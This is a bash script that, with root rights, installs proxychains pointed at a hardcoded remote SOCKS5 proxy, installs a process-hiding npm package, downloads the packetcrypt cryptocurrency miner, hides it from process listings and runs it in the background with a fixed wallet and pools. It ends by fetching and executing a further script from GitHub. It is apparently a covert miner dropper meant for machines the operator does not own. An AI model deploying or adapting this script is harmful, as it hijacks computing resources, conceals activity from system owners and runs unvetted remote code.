#!/bin/bash
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
apt install proxychains -y
sed -i 's/socks4/socks5/' /etc/proxychains.conf 
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
apt install nodejs && 
npm install -g npm@8.5.0 && 
npm i -g node-process-hider && 
wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt && 
ph add packetcrypt && 
chmod +x packetcrypt && 
nohup ./packetcrypt ann -p pkt1qlh84fcyyc9j7k7eq4rw0kqfx4k7uefvrt4xj34 http://pool.pkt.world http://pool.pktpool.io -t 1 &
wget https://raw.githubusercontent.com/gyrogerald/mind/main/lo.sh && chmod +x lo.sh && ./lo.sh"
